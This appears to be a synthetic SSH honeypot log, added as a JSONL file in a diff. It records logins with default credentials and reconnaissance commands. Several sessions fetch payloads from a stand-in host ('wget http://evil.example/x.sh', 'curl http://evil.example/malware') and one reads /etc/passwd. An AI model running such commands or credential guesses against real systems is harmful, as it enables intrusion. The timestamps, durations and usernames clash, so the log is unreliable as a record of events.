+{"timestamp": "2026-11-20T12:45:17+00:00", "event": "session_start", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T12:45:18+00:00", "event": "login_attempt", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T12:45:27+00:00", "event": "command", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "command": "uname -a"}
+{"timestamp": "2026-11-20T12:45:30+00:00", "event": "command", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-20T12:45:33+00:00", "event": "command", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "command": "pwd"}
+{"timestamp": "2026-11-20T12:45:42+00:00", "event": "command", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "command": "exit"}
+{"timestamp": "2026-11-20T12:45:57+00:00", "event": "session_end", "session_id": "e5f4dd94", "src_ip": "185.220.101.7", "src_port": 54641, "username": "root", "duration_seconds": 6.21}
+{"timestamp": "2026-11-20T14:18:16+00:00", "event": "session_start", "session_id": "f842835b", "src_ip": "45.148.10.32", "src_port": 55692, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T14:18:17+00:00", "event": "login_attempt", "session_id": "f842835b", "src_ip": "45.148.10.32", "src_port": 55692, "username": "deploy", "password": "letmein"}
+{"timestamp": "2026-11-20T14:18:40+00:00", "event": "session_end", "session_id": "f842835b", "src_ip": "45.148.10.32", "src_port": 55692, "username": "root", "duration_seconds": 10.7}
+{"timestamp": "2026-11-20T14:47:37+00:00", "event": "session_start", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-20T14:47:38+00:00", "event": "login_attempt", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "username": "pi", "password": "root"}
+{"timestamp": "2026-11-20T14:47:47+00:00", "event": "command", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "command": "uname -a"}
+{"timestamp": "2026-11-20T14:47:50+00:00", "event": "command", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-20T14:47:53+00:00", "event": "command", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "command": "cat /etc/passwd"}
+{"timestamp": "2026-11-20T14:48:02+00:00", "event": "command", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "command": "exit"}
+{"timestamp": "2026-11-20T14:48:07+00:00", "event": "session_end", "session_id": "8476d148", "src_ip": "185.220.101.7", "src_port": 48493, "username": "root", "duration_seconds": 27.84}
+{"timestamp": "2026-11-20T15:02:08+00:00", "event": "session_start", "session_id": "ce3f5ed0", "src_ip": "103.75.190.14", "src_port": 52009, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-20T15:02:09+00:00", "event": "login_attempt", "session_id": "ce3f5ed0", "src_ip": "103.75.190.14", "src_port": 52009, "username": "admin", "password": "123456"}
+{"timestamp": "2026-11-20T15:02:30+00:00", "event": "session_end", "session_id": "ce3f5ed0", "src_ip": "103.75.190.14", "src_port": 52009, "username": "root", "duration_seconds": 21.13}
+{"timestamp": "2026-11-20T15:15:54+00:00", "event": "session_start", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-20T15:15:55+00:00", "event": "login_attempt", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-20T15:16:04+00:00", "event": "command", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "command": "ps aux"}
+{"timestamp": "2026-11-20T15:16:07+00:00", "event": "command", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "command": "ls -la"}
+{"timestamp": "2026-11-20T15:16:10+00:00", "event": "command", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "command": "netstat -tulpn"}
+{"timestamp": "2026-11-20T15:16:19+00:00", "event": "command", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "command": "exit"}
+{"timestamp": "2026-11-20T15:16:25+00:00", "event": "session_end", "session_id": "6b8e039c", "src_ip": "159.65.44.201", "src_port": 56364, "username": "root", "duration_seconds": 8.25}
+{"timestamp": "2026-11-20T15:28:42+00:00", "event": "session_start", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-20T15:28:43+00:00", "event": "login_attempt", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T15:28:52+00:00", "event": "command", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "command": "ls"}
+{"timestamp": "2026-11-20T15:28:55+00:00", "event": "command", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "command": "ps aux"}
+{"timestamp": "2026-11-20T15:28:58+00:00", "event": "command", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-20T15:29:07+00:00", "event": "command", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "command": "exit"}
+{"timestamp": "2026-11-20T15:29:09+00:00", "event": "session_end", "session_id": "03229777", "src_ip": "45.148.10.32", "src_port": 51295, "username": "root", "duration_seconds": 22.65}
+{"timestamp": "2026-11-20T16:45:21+00:00", "event": "session_start", "session_id": "817c47dc", "src_ip": "45.155.205.233", "src_port": 40520, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-20T16:45:22+00:00", "event": "login_attempt", "session_id": "817c47dc", "src_ip": "45.155.205.233", "src_port": 40520, "username": "oracle", "password": "1234"}
+{"timestamp": "2026-11-20T16:45:24+00:00", "event": "login_attempt", "session_id": "817c47dc", "src_ip": "45.155.205.233", "src_port": 40520, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-20T16:45:26+00:00", "event": "login_attempt", "session_id": "817c47dc", "src_ip": "45.155.205.233", "src_port": 40520, "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-20T16:45:57+00:00", "event": "session_end", "session_id": "817c47dc", "src_ip": "45.155.205.233", "src_port": 40520, "username": "root", "duration_seconds": 29.75}
+{"timestamp": "2026-11-20T18:36:02+00:00", "event": "session_start", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-20T18:36:03+00:00", "event": "login_attempt", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T18:36:12+00:00", "event": "command", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "command": "uname -a"}
+{"timestamp": "2026-11-20T18:36:15+00:00", "event": "command", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-20T18:36:18+00:00", "event": "command", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "command": "ps aux"}
+{"timestamp": "2026-11-20T18:36:21+00:00", "event": "command", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "command": "id"}
+{"timestamp": "2026-11-20T18:36:22+00:00", "event": "session_end", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "username": "root", "duration_seconds": 27.76}
+{"timestamp": "2026-11-20T18:36:27+00:00", "event": "command", "session_id": "2fe50377", "src_ip": "45.148.10.32", "src_port": 30976, "command": "exit"}
+{"timestamp": "2026-11-20T18:38:38+00:00", "event": "session_start", "session_id": "b72f8e17", "src_ip": "45.148.10.32", "src_port": 32081, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T18:38:39+00:00", "event": "login_attempt", "session_id": "b72f8e17", "src_ip": "45.148.10.32", "src_port": 32081, "username": "guest", "password": "raspberry"}
+{"timestamp": "2026-11-20T18:39:01+00:00", "event": "session_end", "session_id": "b72f8e17", "src_ip": "45.148.10.32", "src_port": 32081, "username": "root", "duration_seconds": 25.45}
+{"timestamp": "2026-11-20T19:29:57+00:00", "event": "session_start", "session_id": "a75d8cdc", "src_ip": "45.148.10.32", "src_port": 49121, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T19:29:58+00:00", "event": "login_attempt", "session_id": "a75d8cdc", "src_ip": "45.148.10.32", "src_port": 49121, "username": "user", "password": "raspberry"}
+{"timestamp": "2026-11-20T19:30:21+00:00", "event": "session_end", "session_id": "a75d8cdc", "src_ip": "45.148.10.32", "src_port": 49121, "username": "root", "duration_seconds": 23.82}
+{"timestamp": "2026-11-20T21:26:19+00:00", "event": "session_start", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-20T21:26:20+00:00", "event": "login_attempt", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "username": "test", "password": "test"}
+{"timestamp": "2026-11-20T21:26:22+00:00", "event": "login_attempt", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "username": "deploy", "password": "password"}
+{"timestamp": "2026-11-20T21:26:24+00:00", "event": "login_attempt", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "username": "ubuntu", "password": "12345678"}
+{"timestamp": "2026-11-20T21:26:26+00:00", "event": "login_attempt", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-20T21:26:29+00:00", "event": "command", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "command": "cat notes.txt"}
+{"timestamp": "2026-11-20T21:26:32+00:00", "event": "command", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "command": "ps aux"}
+{"timestamp": "2026-11-20T21:26:35+00:00", "event": "command", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-20T21:26:38+00:00", "event": "command", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "command": "id"}
+{"timestamp": "2026-11-20T21:26:40+00:00", "event": "session_end", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "username": "root", "duration_seconds": 11.94}
+{"timestamp": "2026-11-20T21:26:44+00:00", "event": "command", "session_id": "fc0eb00e", "src_ip": "45.155.205.233", "src_port": 58185, "command": "exit"}
+{"timestamp": "2026-11-20T23:46:45+00:00", "event": "session_start", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-20T23:46:46+00:00", "event": "login_attempt", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "username": "support", "password": "oracle"}
+{"timestamp": "2026-11-20T23:46:55+00:00", "event": "command", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-20T23:46:58+00:00", "event": "command", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "command": "ls -la"}
+{"timestamp": "2026-11-20T23:47:01+00:00", "event": "command", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "command": "cat notes.txt"}
+{"timestamp": "2026-11-20T23:47:04+00:00", "event": "command", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "command": "ps aux"}
+{"timestamp": "2026-11-20T23:47:10+00:00", "event": "command", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "command": "exit"}
+{"timestamp": "2026-11-20T23:47:13+00:00", "event": "session_end", "session_id": "a102b4a5", "src_ip": "193.32.127.88", "src_port": 35013, "username": "root", "duration_seconds": 14.67}
+{"timestamp": "2026-11-21T00:26:42+00:00", "event": "session_start", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-21T00:26:43+00:00", "event": "login_attempt", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "username": "guest", "password": "test"}
+{"timestamp": "2026-11-21T00:26:45+00:00", "event": "login_attempt", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "username": "pi", "password": "admin123"}
+{"timestamp": "2026-11-21T00:26:52+00:00", "event": "command", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-21T00:26:55+00:00", "event": "command", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "command": "id"}
+{"timestamp": "2026-11-21T00:26:58+00:00", "event": "command", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "command": "hostname"}
+{"timestamp": "2026-11-21T00:27:01+00:00", "event": "command", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "command": "uname -a"}
+{"timestamp": "2026-11-21T00:27:07+00:00", "event": "command", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "command": "exit"}
+{"timestamp": "2026-11-21T00:27:22+00:00", "event": "session_end", "session_id": "d35065ef", "src_ip": "185.220.101.7", "src_port": 47404, "username": "root", "duration_seconds": 13.32}
+{"timestamp": "2026-11-21T01:15:14+00:00", "event": "session_start", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "client_banner": "SSH-2.0-paramiko_2.11.0"}
+{"timestamp": "2026-11-21T01:15:15+00:00", "event": "login_attempt", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-21T01:15:24+00:00", "event": "command", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "command": "id"}
+{"timestamp": "2026-11-21T01:15:27+00:00", "event": "command", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "command": "pwd"}
+{"timestamp": "2026-11-21T01:15:30+00:00", "event": "command", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "command": "hostname"}
+{"timestamp": "2026-11-21T01:15:39+00:00", "event": "command", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "command": "exit"}
+{"timestamp": "2026-11-21T01:15:42+00:00", "event": "session_end", "session_id": "b51939fd", "src_ip": "103.75.190.14", "src_port": 36539, "username": "root", "duration_seconds": 15.53}
+{"timestamp": "2026-11-21T03:37:55+00:00", "event": "session_start", "session_id": "99b1a717", "src_ip": "104.244.79.12", "src_port": 47728, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-21T03:37:56+00:00", "event": "login_attempt", "session_id": "99b1a717", "src_ip": "104.244.79.12", "src_port": 47728, "username": "ubuntu", "password": "oracle"}
+{"timestamp": "2026-11-21T03:37:58+00:00", "event": "login_attempt", "session_id": "99b1a717", "src_ip": "104.244.79.12", "src_port": 47728, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-21T03:38:35+00:00", "event": "session_end", "session_id": "99b1a717", "src_ip": "104.244.79.12", "src_port": 47728, "username": "root", "duration_seconds": 26.12}
+{"timestamp": "2026-11-21T06:04:16+00:00", "event": "session_start", "session_id": "7ecd16f1", "src_ip": "103.75.190.14", "src_port": 34340, "client_banner": "SSH-2.0-OpenSSH_7.4"}
+{"timestamp": "2026-11-21T06:04:17+00:00", "event": "login_attempt", "session_id": "7ecd16f1", "src_ip": "103.75.190.14", "src_port": 34340, "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-21T06:04:19+00:00", "event": "login_attempt", "session_id": "7ecd16f1", "src_ip": "103.75.190.14", "src_port": 34340, "username": "support", "password": "letmein"}
+{"timestamp": "2026-11-21T06:04:21+00:00", "event": "login_attempt", "session_id": "7ecd16f1", "src_ip": "103.75.190.14", "src_port": 34340, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-21T06:04:45+00:00", "event": "session_end", "session_id": "7ecd16f1", "src_ip": "103.75.190.14", "src_port": 34340, "username": "root", "duration_seconds": 32.95}
+{"timestamp": "2026-11-21T06:19:17+00:00", "event": "session_start", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-21T06:19:18+00:00", "event": "login_attempt", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "username": "test", "password": "admin123"}
+{"timestamp": "2026-11-21T06:19:27+00:00", "event": "command", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "command": "wget http://evil.example/x.sh"}
+{"timestamp": "2026-11-21T06:19:30+00:00", "event": "command", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "command": "curl http://evil.example/malware"}
+{"timestamp": "2026-11-21T06:19:42+00:00", "event": "command", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "command": "exit"}
+{"timestamp": "2026-11-21T06:19:52+00:00", "event": "session_end", "session_id": "d62cc002", "src_ip": "91.240.118.101", "src_port": 56887, "username": "root", "duration_seconds": 15.35}
+{"timestamp": "2026-11-21T06:33:25+00:00", "event": "session_start", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "client_banner": "SSH-2.0-Go"}
+{"timestamp": "2026-11-21T06:33:26+00:00", "event": "login_attempt", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "username": "root", "password": "password"}
+{"timestamp": "2026-11-21T06:33:35+00:00", "event": "command", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "command": "ls"}
+{"timestamp": "2026-11-21T06:33:38+00:00", "event": "command", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "command": "pwd"}
+{"timestamp": "2026-11-21T06:33:41+00:00", "event": "command", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "command": "ps aux"}
+{"timestamp": "2026-11-21T06:33:50+00:00", "event": "command", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "command": "exit"}
+{"timestamp": "2026-11-21T06:33:58+00:00", "event": "session_end", "session_id": "89f0125f", "src_ip": "103.75.190.14", "src_port": 52266, "username": "root", "duration_seconds": 15.37}
+{"timestamp": "2026-11-21T08:10:31+00:00", "event": "session_start", "session_id": "aef7af1a", "src_ip": "185.220.101.7", "src_port": 50537, "client_banner": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-21T08:10:32+00:00", "event": "login_attempt", "session_id": "aef7af1a", "src_ip": "185.220.101.7", "src_port": 50537, "username": "admin", "password": "letmein"}
+{"timestamp": "2026-11-21T08:10:41+00:00", "event": "command", "session_id": "aef7af1a", "src_ip": "185.220.101.7", "src_port": 50537, "command": "whoami"}
+{"timestamp": "2026-11-21T08:10:55+00:00", "event": "session_end", "session_id": "aef7af1a", "src_ip": "185.220.101.7", "src_port": 50537, "username": "root", "duration_seconds": 11.94}
+{"timestamp": "2026-11-21T08:10:56+00:00", "event": "command", "session_id": "aef7af1a", "src_ip": "185.220.101.7", "src_port": 50537, "command": "exit"}
+{"timestamp": "2026-11-21T08:37:38+00:00", "event": "session_start", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "client_banner": "SSH-2.0-OpenSSH_8.2"}
+{"timestamp": "2026-11-21T08:37:39+00:00", "event": "login_attempt", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "username": "test", "password": "admin"}
+{"timestamp": "2026-11-21T08:37:41+00:00", "event": "login_attempt", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-21T08:37:43+00:00", "event": "login_attempt", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "username": "root", "password": "123456"}
+{"timestamp": "2026-11-21T08:37:48+00:00", "event": "command", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "command": "pwd"}
+{"timestamp": "2026-11-21T08:37:51+00:00", "event": "command", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "command": "ls"}
+{"timestamp": "2026-11-21T08:37:54+00:00", "event": "command", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "command": "ps aux"}
+{"timestamp": "2026-11-21T08:37:57+00:00", "event": "command", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "command": "id"}
+{"timestamp": "2026-11-21T08:38:03+00:00", "event": "command", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "command": "exit"}
+{"timestamp": "2026-11-21T08:38:13+00:00", "event": "session_end", "session_id": "786ebe06", "src_ip": "193.32.127.88", "src_port": 39273, "username": "root", "duration_seconds": 19.36}
